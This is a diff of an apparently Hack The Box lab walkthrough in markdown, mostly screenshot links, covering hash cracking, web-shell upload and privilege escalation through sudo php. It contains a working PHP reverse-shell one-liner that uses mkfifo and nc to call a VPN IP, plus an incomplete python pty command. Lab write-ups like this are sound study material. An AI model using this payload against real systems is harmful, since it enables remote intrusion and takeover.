@@ -84,16 +84,20 @@ The identified paths include:
 
 >We have got login page 
 
-![file:///tmp/.55BCJ3/6.png](file:///tmp/.55BCJ3/6.png)
+<img width="908" height="471" alt="image" src="https://github.com/user-attachments/assets/1001bb8f-9d2d-44eb-818c-592f7ad04a4e" />
+
 
 
 >After checking all pages. i found username and password
 
-![file:///tmp/.55BCJ3/7.png](file:///tmp/.55BCJ3/7.png)
+<img width="403" height="399" alt="image" src="https://github.com/user-attachments/assets/007f8a03-7d85-48ad-b821-da0c6642ae60" />
 
-![file:///tmp/.55BCJ3/8.png](file:///tmp/.55BCJ3/8.png)
 
-![file:///tmp/.55BCJ3/9.png](file:///tmp/.55BCJ3/9.png)
+<img width="430" height="222" alt="image" src="https://github.com/user-attachments/assets/de3ed101-af20-4eca-b33e-606c9323882f" />
+
+
+<img width="774" height="262" alt="image" src="https://github.com/user-attachments/assets/436ec8ba-1b78-4516-8345-e07b0ea70100" />
+
 
 >But the password is encryption so we have to use hashcat to decryption.
 
@@ -101,17 +105,68 @@ The identified paths include:
 echo "d033e22ae348aeb5660fc2140aec35850c4da997" >> KnowledgeCheck.txt
 ```
 
-![file:///tmp/.55BCJ3/11.png](file:///tmp/.55BCJ3/11.png)
+<img width="727" height="941" alt="image" src="https://github.com/user-attachments/assets/af2636a6-092d-4826-a81c-a69c42db3d8a" />
+
 
 >Use --show to Display already cracked hashes
 
-![file:///tmp/.55BCJ3/12.png](file:///tmp/.55BCJ3/12.png)
+<img width="655" height="63" alt="image" src="https://github.com/user-attachments/assets/81d76576-e692-4f67-96aa-42730ce60306" />
+
 
 >now we got username and password. try to login.
 
-![file:///tmp/.55BCJ3/13.png](file:///tmp/.55BCJ3/13.png)
+<img width="1518" height="437" alt="image" src="https://github.com/user-attachments/assets/49ab6e28-6f6d-4614-a7af-33eb5c99aa0c" />
+
 
 >After exploring the web app i found a vulnerability
 
-![file:///tmp/.55BCJ3/14.png](file:///tmp/.55BCJ3/14.png)
+<img width="1050" height="328" alt="image" src="https://github.com/user-attachments/assets/99b5066f-1b9a-4d9c-a228-87cac7eb2550" />
+
+<img width="728" height="338" alt="image" src="https://github.com/user-attachments/assets/05afe90e-7661-44f1-a180-db95fadddd97" />
+
+
+<img width="1241" height="974" alt="image" src="https://github.com/user-attachments/assets/31c4d03b-b456-499c-b8c1-acb2284950d9" />
+
+<img width="818" height="108" alt="image" src="https://github.com/user-attachments/assets/bb33ffd9-8001-43ea-8bcb-e959a367344f" />
+
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.146 9443 >/tmp/f"); ?>
+
+<img width="536" height="124" alt="image" src="https://github.com/user-attachments/assets/e5f115e8-c885-4c32-9fa0-2c6b98e3107d" />
+
+
+use ls to check directiry  
+or  
+python3 -c 'import pty; pty.spawn("/bin/bash
+run this command for more interactive shell
+
+<img width="296" height="217" alt="image" src="https://github.com/user-attachments/assets/d57f915c-53a9-405e-a0d5-19c3733db3e3" />
+
+<img width="1375" height="545" alt="image" src="https://github.com/user-attachments/assets/e95a519c-be9b-46a7-b18e-733c0fd5531c" />
+## Privilege Escalation
+<img width="958" height="112" alt="image" src="https://github.com/user-attachments/assets/5ecffb08-d19a-4b4b-ac9e-ab43a54ac49d" />
+
+https://github.com/rebootuser/LinEnum
+
+https://academy.hackthebox.com/module/77/section/844
+
+<img width="726" height="255" alt="image" src="https://github.com/user-attachments/assets/382972dc-6539-4e59-94e9-3593ec6de60b" />
+>use vpn ip address
+<img width="650" height="100" alt="image" src="https://github.com/user-attachments/assets/c04f49e0-4b1c-4682-afc3-392e4e541ba2" />
+
+use vpn ip address
+<img width="644" height="192" alt="image" src="https://github.com/user-attachments/assets/c0679a95-ab2c-4a45-9524-19932a07b436" />
+
+<img width="458" height="88" alt="image" src="https://github.com/user-attachments/assets/0c10fd9e-9d75-4cd0-8b51-c9743c6678c9" />
+ its not working so i will use sudo -l
+
+ <img width="753" height="134" alt="image" src="https://github.com/user-attachments/assets/db14c768-4dfb-4a9d-99d1-c16a23a94dda" />
+
+ we can use /usr/bin/php without password
+
+got root shell 
+<img width="604" height="91" alt="image" src="https://github.com/user-attachments/assets/69a8e468-9890-412d-84cc-1543cc163337" />
+<img width="374" height="198" alt="image" src="https://github.com/user-attachments/assets/103ca6db-d85b-4d62-8498-79c781c168c6" />
+
+
+
 
